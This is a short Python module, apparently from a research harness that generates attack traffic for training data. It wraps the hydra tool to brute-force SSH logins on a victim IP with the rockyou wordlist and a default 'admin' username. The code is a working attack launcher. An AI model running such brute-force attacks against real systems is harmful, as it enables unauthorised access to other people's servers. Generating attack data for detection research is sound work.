"""SSH brute force attack (FR-2.4, Table 5.4). Wraps hydra."""

from pathlib import Path

from training.selfcollected.attacks.common.runner import (
    AttackRecord, check_tools, run_attack, run_subprocess,
)

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"


def build_command(victim_ip: str, port: int, username: str, wordlist: str) -> list[str]:
    return ["hydra", "-l", username, "-P", wordlist, "-s", str(port), victim_ip, "ssh"]


def parse_extra_args(extra: list[str]) -> dict:
    parsed = {"port": 22, "username": "admin", "wordlist": DEFAULT_WORDLIST}
    it = iter(extra)
    for arg in it:
        if arg == "--port":
            parsed["port"] = int(next(it))
        elif arg == "--username":
            parsed["username"] = next(it)
        elif arg == "--wordlist":
            parsed["wordlist"] = next(it)
    return parsed


def run(
    victim_ip: str,
    attacker_ip: str,
    out_dir: Path,
    port: int = 22,
    username: str = "admin",
    wordlist: str = DEFAULT_WORDLIST,
    dry_run: bool = False,
) -> AttackRecord:
    params = {"port": port, "username": username, "wordlist": wordlist}

    def body():
        check_tools(["hydra"])
        run_subprocess(build_command(victim_ip, port, username, wordlist))

    return run_attack("ssh_bruteforce", "hydra", attacker_ip, victim_ip, out_dir, params, body, dry_run)
